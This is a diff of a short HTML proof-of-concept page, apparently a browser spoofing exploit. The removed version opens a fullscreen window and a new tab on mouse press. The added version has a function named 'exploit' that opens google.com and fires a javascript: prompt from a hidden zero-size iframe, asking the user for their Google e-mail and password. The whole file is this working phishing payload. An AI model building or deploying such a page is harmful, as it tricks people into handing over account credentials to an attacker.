@@ -1,25 +1,25 @@
+<html>
+  <body>
 
-<script>
+    <script>
 
-onmousedown=function(){
-document.documentElement.webkitRequestFullScreen();
-open("https://anything.com", "_blank");
-}
+    function exploit() {
 
-onclick=function removeText() { 
+      window.open("https://www.google.com");
 
-                document.getElementById("remove")
+      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+    
+    }
+    
+    </script>
 
-                .outerHTML = "<h1>POC</h1>";
+    <br><br><br><br>
 
-            }
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
 
-</script>
+    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
 
-<div id="remove">
-
-<center>
-<h1>Click Anywhere On Screen</h1>
-
-</center>
-        </div>
+  </body>
+</html>
